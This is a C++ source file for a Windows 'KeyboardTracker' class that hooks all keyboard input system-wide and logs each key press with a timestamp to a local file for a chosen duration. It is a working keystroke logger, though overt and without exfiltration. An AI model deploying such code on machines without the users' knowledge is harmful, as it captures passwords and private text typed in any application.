#include "KeyboardTracker.h"

std::ofstream KeyboardTracker::logFile;
bool KeyboardTracker::isTracking = false;
std::chrono::system_clock::time_point KeyboardTracker::endTime;
HHOOK KeyboardTracker::keyboardHook = NULL;

KeyboardTracker::KeyboardTracker() {}

KeyboardTracker::~KeyboardTracker() {
    StopTracking();
}

bool KeyboardTracker::StartTracking(const std::string& filename, int durationSeconds) {
    if (isTracking) return false;

    logFile.open(filename, std::ios::out | std::ios::app);
    if (!logFile.is_open()) return false;

    // Set end time
    endTime = std::chrono::system_clock::now() + std::chrono::seconds(durationSeconds);

    // Install keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        logFile.close();
        return false;
    }

    isTracking = true;
    logFile << "=== Tracking started ===" << std::endl;
    return true;
}

void KeyboardTracker::StopTracking() {
    if (!isTracking) return;

    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }

    logFile << "=== Tracking stopped ===" << std::endl;
    logFile.close();
    isTracking = false;
}

LRESULT CALLBACK KeyboardTracker::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            LogKeyPress(kbStruct->vkCode);

            // Check if tracking duration has expired
            if (std::chrono::system_clock::now() >= endTime) {
                PostMessage(NULL, WM_QUIT, 0, 0);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeyboardTracker::LogKeyPress(DWORD vkCode) {
    if (!isTracking) return;

    // Get current time
    auto now = std::chrono::system_clock::now();
    auto timeT = std::chrono::system_clock::to_time_t(now);
    std::tm localTime;
    localtime_s(&localTime, &timeT);

    // Format timestamp and key info
    char timestamp[32];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &localTime);

    // Get key name
    char keyName[32];
    GetKeyNameTextA(MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC) << 16, keyName, sizeof(keyName));

    logFile << timestamp << " - Key: " << keyName << std::endl;
}